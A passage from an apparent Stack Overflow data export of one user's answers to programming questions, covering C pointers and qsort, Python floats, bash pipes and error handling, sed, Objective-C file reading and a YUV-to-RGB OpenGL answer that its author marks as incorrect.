  : 'char [30]' differs in levels of
  indirection from 'char ** '</p>
  
  <p>regarding (line message =
  &amp;words[handle];) : error C2106: '=' :
  left operand must be l-value</p>
  
  <p>regarding (line message='words';) :
  error C2015: too many characters in
  constant</p>
  
  <p>regarding (line message='words';) :
  error C2106: '=' : left operand must
  be l-value</p>
</blockquote>

<p>can't I work with pointers that way?
Do you have any suggestions?</p>
","9530","","<p>You have a number of problems with your code.  First of all, you should declare your array of keywords as <code>const char *words[]</code>.  It's bad practice to declare string constants as <code>char *</code>, without the <code>const</code>; it's only allowed so that legacy code still compiles.</p>

<p>You shouldn't specify the array size of 29 in the declaration, since it's fragile.  You should just use empty brackets and let the compiler figure out the array size.  You can get the size of the array by doing <code>sizeof(words)/sizeof(words[0])</code>, which will still be correct even if you add or delete elements from <code>words</code>.</p>

<p>Next, your <code>for</code> loop is never going to terminate (although it will almost assuredly segfault at some point).  Taking the address of a value will never yield the null pointer, so <code>&amp;words[handle] != NULL</code> will always be true.  The proper way to iterate through the loop is to just count the number of entries:</p>

<pre><code>for(handle = 0; handle &lt; sizeof(words)/sizeof(words[0]); handle++)
</code></pre>

<p><code>message</code> is declared as an array of characters.  Arrays aren't assignable, i.e. they are not lvalues.  If you want to assign to an array, you have to explicitly copy data into it with something such as <code>strcpy()</code> (not recommended except in select cases, due to potential buffer overflows), <code>strncpy()</code>, <code>memcpy()</code>, or <code>strncpy_s()</code> (available only on Windows).</p>

<p>In this case, though, you don't want an array at all -- you just want to assign a pointer.  Declare <code>message</code> as a <code>const char *</code> instead.  With <code>message</code> declared properly, you would do:</p>

<pre><code>const char *message;
...
message = words[handle];
if(!strcmp(token, message))
    message = ""words"";
</code></pre>

<p>In the final statement there, you should use double quotes around <code>words</code> to make it a string constant.  Single quotes are for single character constants (e.g. <code>'A'</code>).  Although they technically can contain more than one character, the endianness of the resulting integer constant is implementation-defined, and they're not what you want in this case.</p>

<p>I'm also not quite sure what you're trying to do with the <code>message = ""words"";</code> line.  If you're trying to do some clever trick with the <code>words</code> variable, stop right now, it's not going to work.  C doesn't have any sort of reflection.</p>
"
"<p>This is in relation to a homework assignment but this is not the homework assignment. </p>

<p>I'm having difficultly understanding if there is a difference on how the bitwise not (<code>~</code> in C) would affected <code>signed int</code> and <code>unsigned int</code> when compiled on a big endian machine vs. a little endian machine. </p>

<p>Are the bytes <em>really</em> ""backwards"" and if so does the bitwise not (and other operators) cause different resulting <code>int</code>s be produced depending on the machine type?</p>

<p>While we are at it, is the answer the same for each of the bitwise operators in C or does it heavily depend? </p>

<p>The operators I'm referring to are:</p>

<pre><code>~  /* bitwise Not */
&amp;  /* bitwise And */
|  /* bitwise Or */
^  /* bitwise Exclusive-Or */
</code></pre>

<p>Thank you in Advance!</p>

<p><strong>Update:</strong> In reading my responses thus far, I feel compelled to ask if the bitwise not operator affects the sign bit on a <code>signed int</code>. I'm afraid I've been a bit confused on this part as I forgot about all that stillyness. Adam seems to be stating that all values are treated as unsigned. Is the sign-bit reapplied or does the once signed value become unsigned?</p>
","9530","","<p>The bitwise operators and logical operators all operate identically in big- and little-endian machines.  Likewise, they also operator identically on signed and unsigned data: the result is as if everything were unsigned.  So, if <code>x</code> and <code>y</code> are signed integers, then <code>~x</code> equals <code>(int)(~((unsigned int)x)</code> and <code>x &amp; y</code> equals <code>(int)(((unsigned int)x) &amp; ((unsigned int)y)</code>, and so on for all of the other operators.</p>
"
"<p><strong>Problem:</strong> to see when computer makes approximation in mathematical calculations when I use Python</p>

<p><strong>Example of the problem:</strong></p>

<p>My old teacher once said the following statement</p>

<pre><code>You cannot never calculate 200! with your computer.
</code></pre>

<p>I am not completely sure whether it is true or not nowadays.
It seems that it is, since I get a lot zeros for it from a <a href=""http://stackoverflow.com/questions/1041348/unable-to-make-a-factorial-function-in-python"">Python script</a>.</p>

<p><strong>How can you see when your Python code makes approximations?</strong></p>
","9530","","<p>Python use <a href=""http://en.wikipedia.org/wiki/Arbitrary-precision%5Farithmetic"" rel=""nofollow"">arbitrary-precision arithmetic</a> to calculate with integers, so it can exactly calculate 200!.  For real numbers (so-called <a href=""http://en.wikipedia.org/wiki/Floating-point"" rel=""nofollow""><em>floating-point</em></a>), Python does not use an exact representation.  It uses a binary representation called <a href=""http://en.wikipedia.org/wiki/IEEE%5F754"" rel=""nofollow"">IEEE 754</a>, which is essentially scientific notation, except in base 2 instead of base 10.</p>

<p>Thus, any real number that cannot be exactly represented in base 2 with 53 bits of precision, Python cannot produce an exact result.  For example, 0.1 (in base 10) is an infinite decimal in base 2, 0.0001100110011..., so it cannot be exactly represented.  Hence, if you enter on a Python prompt:</p>

<pre><code>&gt;&gt;&gt; 0.1
0.10000000000000001
</code></pre>

<p>The result you get back is different, since has been converted from decimal to binary (with 53 bits of precision), back to decimal.  As a consequence, you get things like this:</p>

<pre><code>&gt;&gt;&gt; 0.1 + 0.2 == 0.3
False
</code></pre>

<p>For a good (but long) read, see <a href=""http://docs.sun.com/source/806-3568/ncg%5Fgoldberg.html"" rel=""nofollow"">What Every Programmer Should Know About Floating-Point Arithmetic</a>.</p>
"
"<p>What is the appropriate way of dealing with large text files in Objective-C? Let's say I need to read each line separately and want to treat each line as an NSString. What is the most efficient way of doing this?</p>

<p>One solution is using the NSString method:</p>

<pre><code>+ (id)stringWithContentsOfFile:(NSString *)path 
      encoding:(NSStringEncoding)enc 
      error:(NSError **)error
</code></pre>

<p>and then split the lines with a newline separator, and then iterate over the elements in the array. However, this seems fairly inefficient. Is there no easy way to treat the file as a stream, enumerating over each line, instead of just reading it all in at once? Kinda like Java's java.io.BufferedReader.</p>
","9530","","<p>This should do the trick:</p>

<pre><code>#include &lt;stdio.h&gt;

NSString *readLineAsNSString(FILE *file)
{
    char buffer[4096];

    // tune this capacity to your liking -- larger buffer sizes will be faster, but
    // use more memory
    NSMutableString *result = [NSMutableString stringWithCapacity:256];

    // Read up to 4095 non-newline characters, then read and discard the newline
    int charsRead;
    do
    {
        if(fscanf(file, ""%4095[^\n]%n%*c"", buffer, &amp;charsRead) == 1)
            [result appendFormat:@""%s"", buffer];
        else
            break;
    } while(charsRead == 4095);

    return result;
}
</code></pre>

<p>Use as follows:</p>

<pre><code>FILE *file = fopen(""myfile"", ""r"");
// check for NULL
while(!feof(file))
{
    NSString *line = readLineAsNSString(file);
    // do stuff with line; line is autoreleased, so you should NOT release it (unless you also retain it beforehand)
}
fclose(file);
</code></pre>

<p>This code reads non-newline characters from the file, up to 4095 at a time.  If you have a line that is longer than 4095 characters, it keeps reading until it hits a newline or end-of-file.</p>

<p><em>Note</em>: I have not tested this code.  Please test it before using it.</p>
"
"<p>The line is </p>

<pre><code>function info() { 
    emacs -eval ""(progn (setq Man-notify-method 'bully) (info \""$1\""))"" 
}
</code></pre>

<p>I know from manuals that</p>

<p><strong>Progn</strong></p>

<blockquote>
  <p>progn is a special form in `C source
  code'.</p>
</blockquote>

<p><strong>Setq</strong></p>

<blockquote>
  <p>setq is a special form in `C source
  code'. (setq SYM VAL SYM VAL ...)</p>
  
  <p>Set each SYM to the value of its VAL.
  The symbols SYM are variables; they
  are literal (not evaluated). The
  values VAL are expressions; they are
  evaluated. Thus, (setq x (1+ y)) sets
  <code>x' to the value of </code>(1+ y)'. The
  second VAL is not computed until after
  the first SYM is set, and so on; each
  VAL can use the new value of variables
  set earlier in the <code>setq'. The return
  value of the </code>setq' form is the value
  of the last VAL.</p>
</blockquote>

<p><strong>$1</strong> seems to a reference to the first parameter after the command <code>man</code> which the user gives.</p>

<p><strong>'bully</strong> seems to be a random variable.</p>

<p><strong>Man-notify-method</strong> seems to be an action function which is run when man command is executed.</p>

<p><code>-eval</code> seems to be an evalutian statemant which tells Emacs to run the statement which follows it.</p>

<p>However, I am not completely sure about the function.</p>

<p>I need to understand the function, since I want to bind a <em>bash code of mine</em> to the action function of man. <strong>Man-notify-method</strong> seems to be that action function, at least in Emacs.</p>

<p><strong>How do you understand the line of Emacs Lisp?</strong></p>
","9530","","<p>The code you posted is a combination of shell script and elisp.</p>

<pre><code>function info()
{
    emacs -eval ""(progn (setq Man-notify-method 'bully) (info \""$1\""))""
}
</code></pre>

<p>This defines a shell script function named <code>info</code>.  It takes 1 parameter, named <code>$1</code>.  When you call this function (say, from another shell script), the value of the argument gets substituted in for <code>$1</code>, and it runs the commands specified in sequence.  So, if you were to call it like this:</p>

<pre><code>info(""something"")
</code></pre>

<p>The shell would execute this command:</p>

<pre><code>emacs -eval ""(progn (setq Man-notify-method 'bully) (info \""something\""))""
</code></pre>

<p>This invokes the emacs executable with two arguments, <code>-eval</code> and the command string, which contains embedded escaped quotes.  This is asking emacs to invoke the following elisp code:</p>

<pre><code>(progn (setq Man-notify-method 'bully) (info ""something""))
</code></pre>

<p><code>progn</code> is a <em>special form</em>.  Special forms evaluate their arguments differently than normal function calls.  You can find the documentation for <code>progn</code> in <a href=""http://www.gnu.org/software/emacs/manual/html%5Fnode/elisp/Sequencing.html#Sequencing"">chapter 10.1 of the GNU Emacs Lisp Reference Manual</a>.  <code>progn</code> is a simple construct for executing a sequence of statements in order.  The reason you may need to do this is for cases when you want to execute multiple statements, but the context that you're in only expects a single statement.</p>

<p>For example, an <code>if</code> statement takes 3 (or more) arguments: the condition to evaluate, the expression to evaluate if true, and the expression to evaluate if false.  If more than 3 arguments are provided, the subsequent arguments are part of the else branch.  If you want to use more than one statement in the true branch, you have to use <code>progn</code>:</p>

<pre><code>(if condition
   (progn first-statement-if-true
          second-statement-if-true)
   first-statement-if-false
   second-statement-if-false
)
</code></pre>

<p>In this case, if <code>condition</code> is true, then <code>first-statement-if-true</code> and <code>second-statement-if-true</code> will be evaluated.  Otherwise, <code>first-statement-if-false</code> and <code>second-statement-if-false</code> will be evaluated.</p>

<p>Thus, your code will simply evaluate the two statements <code>(setq Man-notify-method 'bully)</code> and <code>(info ""something"")</code> in order.</p>

<p><code>setq</code> is another special form.  See <a href=""http://www.gnu.org/software/emacs/manual/html%5Fnode/elisp/Setting-Variables.html#Setting-Variables"">chapter 11.8</a> for its documentation.  It simply sets a variable, named by the first parameter, to the value of the second parameter.  The first parameter is <em>not</em> evaluated -- it is taken literally.</p>

<p>A value preceded by a single quote (such as <code>'bully</code>) is not evaluated.  See <a href=""http://www.gnu.org/software/emacs/manual/html%5Fnode/elisp/Quoting.html#Quoting"">chapter 9.3</a> for details on quoting.  Hence, <code>(setq Man-notify-method)</code> sets a variable named <code>Man-notify-method</code> to the literal token <code>bully</code> (which is a data type called a <em>symbol</em>, which is distinct from the string <code>""bully""</code>).</p>

<p>I can't find the documentation on the <code>info</code> function online, you can get help on any given function in emacs by typing <code>C-h f function-name</code>.  So, by typing <code>C-h f info</code>, I got this:</p>

<blockquote>
<pre>info is an interactive autoloaded Lisp function in `info'.
[Arg list not available until function definition is loaded.]

Enter Info, the documentation browser.
Optional argument FILE specifies the file to examine;
the default is the top-level directory of Info.
Called from a program, FILE may specify an Info node of the form
`(FILENAME)NODENAME'.

In interactive use, a prefix argument directs this command
to read a file name from the minibuffer.

The search path for Info files is in the variable `Info-directory-list'.
The top-level Info directory is made by combining all the files named `dir'
in all the directories in that path.</pre>
</blockquote>

<p>The online reference manual is very useful, and emacs' interactive help is also indispensible.  If you don't understand what a particular function does, just <code>C-h f</code> it.</p>
"
"<p>I'm writing a shell script, which at some point has to take a file, search for a particular word in it and delete the whole text that comes after this word (including the word itself) - awk is the right tool I suppose, but I don't really know much about programming in it.</p>

<p>Could anyone help me?</p>
","9530","","<p>I'm not sure how to do it with awk, but you could do it with sed:</p>

<pre><code>sed -i~ -e 's/the-word-to-find.*$//' the-file
</code></pre>

<p>This will delete everything from <code>the-word-to-find</code> to the end of the line, on every line that contains <code>the-word-to-find</code>.  If you want to delete the rest of the file upon the first occurrence of <code>the-word-to-find</code>, you could do:</p>

<pre><code>sed -i~ -e 's/\(the-word-to-find\).*$/\1/;/the-word-to-find/,$d'
</code></pre>
"
"<p>hi I have a collection of nice .png files....
meanwhile, I'm developing a win-based software and need some .ico files as icons for toolbar buttons and ....</p>

<p>Is there any way to use .png file as an icon ? or what?</p>

<p>Thank you</p>
","9530","","<p>If you're loading the images from a resource file, then no, you can't use PNGs, you have to use ICOs.  Fortunately, there are a number of tools that can convert PNGs into ICOs, including <a href=""http://imagemagick.org"" rel=""nofollow"">ImageMagick</a> (great for automation), and MSPaint as a lowest common denominator.</p>

<p>If you're loading image files at runtime, then you can load any type of image format you want (e.g. use <a href=""http://libpng.org/pub/png/libpng.html"" rel=""nofollow"">libpng</a> for loading PNGs), but you still have to convert them to icons internally before you can do interesting things with them, such as setting them as a window's icon.  Once you've decoded the image data, it's not terribly difficult to convert it to the proper format, but it's not trivial, it just involves a lot of data mangling and strange structs and function calls from the Win32 API.</p>
"
"<p>In order to promote good programming habits and increase the efficiency of my code (Read: ""My brother and I are arguing over some code""), I propose this question to experienced programmers:</p>

<p>Which block of code is ""better""?
For those who can't be bothered to read the code, is it worth putting a conditional within a for-loop to decrease the amount of redundant code than to put it outside and make 2 for-loops? Both pieces of code work, the question is efficiency vs. readability.</p>

<pre><code>    - (NSInteger)eliminateGroup {
            NSMutableArray *blocksToKill = [[NSMutableArray arrayWithCapacity:rowCapacity*rowCapacity] retain];
            NSInteger numOfBlocks = (NSInteger)[self countChargeOfGroup:blocksToKill];
            Block *temp;
            NSInteger chargeTotal = 0;

//Start paying attention here

            if (numOfBlocks &gt; 3) 
            	for (NSUInteger i = 0; i &lt; [blocksToKill count]; i++) {
            		temp = (Block *)[blocksToKill objectAtIndex:i];
            		chargeTotal += temp.charge;
            		[temp eliminate];
            		temp.beenCounted = NO;
            	}
            }
            else {
            	for (NSUInteger i = 0; i &lt; [blocksToKill count]; i++) {
            		temp = (Block *)[blocksToKill objectAtIndex:i];
            		temp.beenCounted = NO;
            	}
            }	
            [blocksToKill release];
            return chargeTotal;
        }
</code></pre>

<p>Or...</p>

<pre><code>        - (NSInteger)eliminateGroup {
            NSMutableArray *blocksToKill = [[NSMutableArray arrayWithCapacity:rowCapacity*rowCapacity] retain];
            NSInteger numOfBlocks = (NSInteger)[self countChargeOfGroup:blocksToKill];
            Block *temp;
            NSInteger chargeTotal = 0;

//Start paying attention here

            for (NSUInteger i = 0; i &lt; [blocksToKill count]; i++) {
                temp = (Block *)[blocksToKill objectAtIndex:i];
                if (numOfBlocks &gt; 3) {
                    chargeTotal += temp.charge;
                    [temp eliminate];
                }
                temp.beenCounted = NO;
            }
            [blocksToKill release];
            return chargeTotal;
        }
</code></pre>

<p>Keep in mind that this is for a game. The method is called anytime the user double-taps the screen and the for loop normally runs anywhere between 1 and 15 iterations, 64 at maximum. I understand that it really doesn't matter that much, this is mainly for helping me understand exactly how costly conditional statements are. (Read: I just want to know if I'm right.)</p>
","9530","","<p>All other things being equal, having two separate loops will generally be faster, because you do the test once instead of every iteration of the loop.  The branch inside the loop each iteration will often slow you down significantly due to pipeline stalls and branch mispredictions; however, since the branch always goes the same way, the CPU will almost certainly predict the branch correctly for every iteration except for the first few, assuming you're using a CPU with branch prediction (I'm not sure if the ARM chip used in the iPhone has a branch predictor unit).</p>

<p>However, another thing to consider is code size: the two loops approach generates a lot more code, especially if the rest of the body of the loop is large.  Not only does this increase the size of your program's object code, but it also hurts your instruction cache performance -- you'll get a lot more cache misses.</p>

<p>All things considered, unless the code is a significant bottleneck in your application, I would go with the branch inside of the loop, as it leads to clearer code, and it doesn't violate the <a href=""http://en.wikipedia.org/wiki/Don%27t%5Frepeat%5Fyourself"" rel=""nofollow"">don't repeat yourself principle</a>.  If you make a change to once of the loops and forget to change the other loop in the two-loops version, you're in for a world of hurt.</p>
"
"<p>The common Superclass of Rectangle and Circle is Shape.</p>

<p>If I initialize some shapes, what is a good way of converting the shape into a circle later and keeping the same properties set while it was a shape?   Should I implement a initWithShape in the subclasses that looks something like this?</p>

<pre><code>- (id) initWithShape:(Shape*)aShape {
    self = (id) aShape;

    // set circle or rectangle specific values

    return self;
}
</code></pre>

<p>Does anyone have an example that I can look at?</p>
","9530","","<p>Don't do what you just did.  Think about what happens when you do this:</p>

<pre><code>Shape *shape = ...;
Rectangle *rect = [[Rectangle alloc] initWithShape:shape];
</code></pre>

<p>In the second line, an instance of <code>Rectangle</code> gets allocated.  Then, the return value for <code>initWithShape</code> is just <code>shape</code> again, so the new <code>Rectangle</code> that we just allocated has been leaked!</p>

<p>The cast to <code>id</code> is also unnecessary—any Objective-C object can be implicitly cast to <code>id</code>.</p>

<p>I'm not entirely clear on what you're trying to do.  Perhaps if you clarified your question, I could tell you what you should be doing.</p>
"
"<p>I need to embed the Flash player in a native application (C++) in a cross platform way (at least Windows and Mac OSX). I need to allow the Flash gui to make calls back to the native application to do things that Flash normally can’t do (e.g. write to the file system, talk to devices, loading native image processing libraries, etc). The Adobe AIR runtime is too restrictive so it is unfortunately not an option. I’ve used ActiveX hosting in Windows previously, but is there a cross platform gui toolkit that solves this problem for both Windows and OSX? If not what are my options for embedding Flash on OSX?</p>

<p>EDIT: Must support Actionscript 3.0</p>
","9530","","<p>It's not free, but <a href=""https://www.scaleform.com/products/gfx"" rel=""nofollow"">Scaleform GFx</a> does exactly what you want -- it's cross-platform, and can make calls back and forth between native code and Flash.  It also supports a number of different rendering engines (DirectX, OpenGL, etc.).</p>
"
"<p>I was trying to write up a class in c++, and I came across a rather odd problem: calling outside functions inside of a class that have the same name as the class. It's kinda confusing, so here's an example:</p>

<pre><code>void A(char* D) {
  printf(D);
}

class A 
{
public:
  A(int B);
  void C();
};

A::A(int B) {
  // something here
}

void A::C() {
  A(""Hello, World."");
}
</code></pre>

<p>The compiler complains at the second to last line that it can't find a function A(char*), because it is inside the class, and the constructor has the same name as the function. I could write another function outside, like:</p>

<pre><code>ousideA(char* D) {
  A(D);
}
</code></pre>

<p>And then call outsideA inside of A::C, but this seems like a silly solution to the problem. Anyone know of a more proper way to solve this?</p>
","9530","","<p>Use the <a href=""http://en.wikipedia.org/wiki/Scope%5Fresolution%5Foperator"" rel=""nofollow"">scope resolution operator</a> <code>::</code> to access the name from the global scope:</p>

<pre><code>void A::C() {
  ::A(""Hello, world."");
}
</code></pre>
"
"<p>is it just me or this code in <a href=""http://www.cs.bell-labs.com/cm/cs/pearls/markov.c"" rel=""nofollow"">Programming Pearls</a> is wrong (quicksort wants 2 const voids, no?) If so, is my solution right? Apologies, just learning...</p>

<pre><code>int wordncmp(char *p, char* q)
{   int n = k;
    for ( ; *p == *q; p++, q++)
    	if (*p == 0 &amp;&amp; --n == 0)
    		return 0;
    return *p - *q;
}

int sortcmp(char **p, char **q)
{   return wordncmp(*p, *q);
}
...

qsort(word, nword, sizeof(word[0]), sortcmp);
</code></pre>

<p>Is this a solution?</p>

<pre><code>int sortcmp(const void *p, const void *q)
{   return wordncmp(* (char * const *) p, * (char * const *) q);
}
</code></pre>
","9530","","<p>The first code sample will probably work with virtually any compiler and CPU; however, it is technically undefined behavior, if you follow the C standard to the letter.</p>

<p>As you said, the last argument to <code>qsort()</code> is a pointer to a function taking two arguments of type <code>const void*</code>.  <code>sortcmp</code> takes different arguments.  Your compiler <em>should</em> give you a warning about incompatible type signatures or something.  In any case, a cast is being performed from a function of one type to a function of another type.</p>

<p>The C standard specifies that you can cast function pointers to other function pointers with different types, but you cannot dereference and invoke the casted function pointer.  However, if you re-cast the function pointer back to its original type, then calling that has defined behavior -- it calls the original function.</p>

<p>Since you're casting from a <code>int (*)(char**, char**)</code> to a <code>int (*)(const void*, const void*)</code>, and then eventually <code>qsort()</code> is invoking your comparator function without casting it back to <code>int (*)(char**, char**)</code>, that's undefined behavior.</p>

<p>However, since virtually on all architectures, a <code>char **</code> and a <code>const void*</code> are represented the same way, the function call will pretty much always work.</p>

<p>If you want to get defined behavior, you have to make sure your comparator function has the proper type signature, and then you can cast the arguments to the proper type.  Your solution is exactly correct and does not violate the C standard there.  Well done on <code>const</code>-correctness -- a lot of people don't understand exactly what <code>char * const *</code> means.</p>

<p>You should also make <code>wordncmp()</code> take parameters of <code>const char*</code>, since you're not modifying the parameters.</p>

<p>Side note: You also technically can't cast a function pointer to a data pointer (e.g. a <code>void*</code>) or vice-versa.  The standard allows for function pointers and data pointers to have different sizes.  Even if it works on your computer, it's not guaranteed to always work.</p>
"
"<p>Probably a simple question but...</p>

<p>How does piping work?  If I run a program via CLI and redirect output to a file will I be able to pipe that file into another program as it is being written?  </p>

<p>Basically when one line is written to the file I would like it to be piped immediately to my second application (I am trying to dynamically draw a graph off an existing program).  Just unsure if piping completes the first command before moving on to the next command.</p>

<p>Any feed back would be greatly appreciated!</p>
","9530","","<p>If you want to redirect the output of one program into the input of another, just use a simple pipeline:</p>

<pre><code>program1 arg arg | program2 arg arg
</code></pre>

<p>If you want to save the output of <code>program1</code> into a file <em>and</em> pipe it into <code>program2</code>, you can use <a href=""http://linux.die.net/man/1/tee""><code>tee(1)</code></a>:</p>

<pre><code>program1 arg arg | tee output-file | program2 arg arg
</code></pre>

<p>All programs in a pipeline are run simultaneously.  Most programs typically use <em>blocking</em> I/O: if when they try to read their input and nothing is there, they <em>block</em>: that is, they stop, and the operating system de-schedules them to run until more input becomes available (to avoid eating up the CPU).  Similarly, if a program earlier in the pipeline is writing data faster than a later program can read it, eventually the pipe's buffer fills up and the writer blocks: the OS de-schedules it until the pipe's buffer gets emptied by the reader, and then it can continue writing again.</p>

<p><hr /></p>

<p><strong>EDIT</strong></p>

<p>If you want to use the output of <code>program1</code> as the command-line parameters, you can use the backquotes or the <code>$()</code> syntax:</p>

<pre><code># Runs ""program1 arg"", and uses the output as the command-line arguments for
# program2
program2 `program1 arg`

# Same as above
program2 $(program1 arg)
</code></pre>

<p>The <code>$()</code> syntax should be preferred, since they are clearer, and they can be nested.</p>
"
"<p>In a sort of try/catch form I want to execute a bash that doesn't stop if an error occurs.</p>

<p>The specific bash is:</p>

<pre><code>#!/bin/sh

invoke-rc.d tomcat stop

rm -fr /var/webapps/
cp -R $WEBAPP /var/webapps/
invoke-rc.d tomcat start
</code></pre>

<p>I want to exec ""invoke-rc.d tomcat stop"" and even if Tomcat is not running, continue to execute the other bash commands.</p>
","9530","","<p>Disable the ""exit immediately"" option with <code>set +e</code>, run your command, then optionally re-enable it with <code>set -e</code>:</p>

<pre><code>set +e
invoke-rc.d tomcat stop
set -e  # optional
</code></pre>

<p>See <a href=""http://www.gnu.org/software/bash/manual/bashref.html#The-Set-Builtin"">section 4.3.1</a> of the Bash manual for an explanation of the <code>set</code> builtin and all of its various options (of which there are many).</p>
"
"<p>Is it possible to allocate an arbitrary memory block using the ""new"" operator?
In C I can do it like ""void * p = malloc(7);"" - this will allocate 7 bytes if memory alignment is set to 1 byte. How to make the same in C++ with the new operator?</p>
","9530","","<p>You can't allocate a <code>void</code> pointer with C++'s operator <code>new</code>: you'll have to allocate an explicit type such as <code>char</code> or <code>uint8_t</code>:</p>

<pre><code>char *p = new char[7];
uint8_t *q = new uint8_t[7];
...
delete [] p;
delete [] q;
</code></pre>
"
"<p>This is one of the default gnome screensavers - ""personal slideshow"". It displays pictures from some location, pausing ~10s between pictures. Anyone know how it's looping &amp; pausing?</p>

<p>I'm trying to increase the delay, but I'm hesitant to add sleep() without first knowing how it's doing it.</p>

<p>Thanks</p>

<pre><code>#include ""config.h""

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

#include &lt;glib.h&gt;
#include &lt;glib/gi18n.h&gt;
#include &lt;glib/gstdio.h&gt;
#include &lt;gtk/gtk.h&gt;

#include ""gs-theme-window.h""
#include ""gs-theme-engine.h""
#include ""gste-slideshow.h""

#include ""xdg-user-dir-lookup.h""

int
main (int argc, char **argv)
{
        GSThemeEngine *engine;
        GtkWidget     *window;
        GError        *error;
        gboolean       ret;
        char          *location = NULL;
        char          *background_color = NULL;
        gboolean       sort_images = FALSE;
        gboolean       no_stretch = FALSE;
        GOptionEntry  entries [] = {
                { ""location"", 0, 0, G_OPTION_ARG_STRING, &amp;location,
                  N_(""Location to get images from""), N_(""PATH"") },
                { ""background-color"", 0, 0, G_OPTION_ARG_STRING, &amp;background_color,
                  N_(""Color to use for images background""), N_(""\""#rrggbb\"""") },
                { ""sort-images"", 0, 0, G_OPTION_ARG_NONE, &amp;sort_images,
                  N_(""Do not randomize pictures from location""), NULL },
                { ""no-stretch"", 0, 0, G_OPTION_ARG_NONE, &amp;no_stretch,
                  N_(""Do not try to stretch images on screen""), NULL },
                { NULL }
        };

        bindtextdomain (GETTEXT_PACKAGE, GNOMELOCALEDIR);
        bind_textdomain_codeset (GETTEXT_PACKAGE, ""UTF-8"");
        textdomain (GETTEXT_PACKAGE);

        error = NULL;

        g_thread_init (NULL);
        ret = gtk_init_with_args (&amp;argc, &amp;argv,
                                  NULL,
                                  entries,
                                  NULL,
                                  &amp;error);
        if (! ret) {
                g_message (""%s"", error-&gt;message);
                g_error_free (error);
                exit (1);
        }

        g_chdir (g_get_home_dir ());

        g_set_prgname (""slideshow"");

        window = gs_theme_window_new ();
        g_signal_connect (G_OBJECT (window), ""delete-event"",
                          G_CALLBACK (gtk_main_quit), NULL);

        engine = g_object_new (GSTE_TYPE_SLIDESHOW, NULL);

        if (location == NULL) {
                location = xdg_user_dir_lookup (""PICTURES"");
                if (location == NULL ||
                    strcmp (location, ""/tmp"") == 0 ||
                    strcmp (location, g_get_home_dir ()) == 0) {
                        free (location);
                        location = g_build_filename (g_get_home_dir (), ""Pictures"", NULL);
                }
        }

        if (location != NULL) {
                g_object_set (engine, ""images-location"", location, NULL);
        }

        if (sort_images) {
                g_object_set (engine, ""sort-images"", sort_images, NULL);
        }

        if (background_color != NULL) {
                g_object_set (engine, ""background-color"", background_color, NULL);
        }

        if (no_stretch) {
                g_object_set (engine, ""no-stretch"", no_stretch, NULL);
        }

        gtk_container_add (GTK_CONTAINER (window), GTK_WIDGET (engine));

        gtk_widget_show (GTK_WIDGET (engine));

        gtk_window_set_default_size (GTK_WINDOW (window), 640, 480);
        gtk_widget_show (window);

        gtk_main ();

        return 0;
}
</code></pre>
","9530","","<p>The main event loop is almost certainly inside of the <code>gtk_main()</code> function.  However, you're barking up the wrong tree.  The job of <code>gtk_main()</code> is pump events -- it detects low-level events (such as keyboard/mouse input and OS timers), converts them to higher-level events, and passes those onto the application code.</p>

<p>In this case, the application is the <code>engine</code> object, which is an object of type <code>GSTE_TYPE_SLIDESHOW</code>.  Looking at the <a href=""http://gnome-screensaver.sourcearchive.com/documentation/2.24.0-0ubuntu2/gste-slideshow%5F8c-source.html"" rel=""nofollow"">source code</a>, we see that in the <code>start_new_load()</code> function, it creates a timer object that is ultimately responsible for the delays between pictures.  This is initialized by a hard-coded value of 10000 ms.</p>

<p>If you want to change the timeout, you'll have to recompile the project and make the timeout configurable somehow.</p>
"
"<p>I have been assigned wit the task to write a program that takes a sample raw YUV file and display it in a Cocoa OpenGL program.</p>

<p>I am an intern at my job and I have little or no clue how to start. I have been reading wikipedia &amp; articles on YUV, but I couldn't find any good source code on how to open a raw YUV file, extract the data and convert it into RGB and display it in the view window.</p>

<p>Essentially, I need help with the following aspects of the task
-how to extract the YUV data from the sample YUV file
-how to convert the YUV data into RGB color space
-how to display the RGB color space in OpenGL. (This one I think I can figure out with time, but I really need help with the first two points)</p>

<p>please either tell me the classes to use, or point me to places where i can learn about YUV graphic/video display</p>
","9530","","<p><em>This answer is not correct, see the other answers and comments.  Original answer left below for posterity.</em></p>

<hr>

<p><strike>You can't display it directly.</strike>  You'll need to convert it to an RGB texture.  As you may have gathered from <a href=""http://en.wikipedia.org/wiki/YUV"" rel=""nofollow"">Wikipedia</a>, there are a bunch of variations on the YUV color space.  Make sure you're using the right one.</p>

<p>For each pixel, the conversion from YUV to RGB is a straightforward linear transformation.  You just do the same thing to each pixel independently.</p>

<p>Once you've converted the image to RGB, you can display it by creating a texture.  You need to call <a href=""http://www.opengl.org/documentation/specs/man_pages/hardcopy/GL/html/gl/gentextures.html"" rel=""nofollow""><code>glGenTextures()</code></a> to allocate a texture handle, <a href=""http://www.opengl.org/documentation/specs/man_pages/hardcopy/GL/html/gl/bindtexture.html"" rel=""nofollow""><code>glBindTexture()</code></a> to bind the texture to the render context, and <a href=""http://www.opengl.org/documentation/specs/man_pages/hardcopy/GL/html/gl/teximage2d.html"" rel=""nofollow""><code>glTexImage2D()</code></a> to upload the texture data to the GPU.  To render it, you again call <code>glBindTexture()</code>, followed by the rendering of a quad with texture coordinates set up properly.</p>

<pre><code>// parameters: image:  pointer to raw YUV input data
//             width:  image width (must be a power of 2)
//             height: image height (must be a power of 2)
// returns: a handle to the resulting RGB texture
GLuint makeTextureFromYUV(const float *image, int width, int height)
{
    float *rgbImage = (float *)malloc(width * height * 3 * sizeof(float));  // check for NULL
    float *rgbImagePtr = rgbImage;

    // convert from YUV to RGB (floats used here for simplicity; it's a little
    // trickier with 8-bit ints)
    int y, x;
    for(y = 0; y &lt; height; y++)
    {
        for(x = 0; x &lt; width; x++)
        {
            float Y = *image++;
            float U = *image++;
            float V = *image++;
            *rgbImagePtr++ = Y                + 1.13983f * V;  // R
            *rgbImagePtr++ = Y - 0.39465f * U - 0.58060f * V;  // G
            *rgbImagePtr++ = Y + 2.03211f * U;                 // B
        }
    }

    // create texture
    GLuint texture;
    glGenTextures(1, &amp;texture);

    // bind texture to render context
    glBindTexture(GL_TEXTURE_2D, texture);

    // upload texture data
    glTexImage2D(GL_TEXTURE_2D, 0, 3, width, height, 0, GL_RGB, GL_FLOAT, rgbImage);

    // don't use mipmapping (since we're not creating any mipmaps); the default
    // minification filter uses mipmapping.  Use linear filtering for minification
    // and magnification.
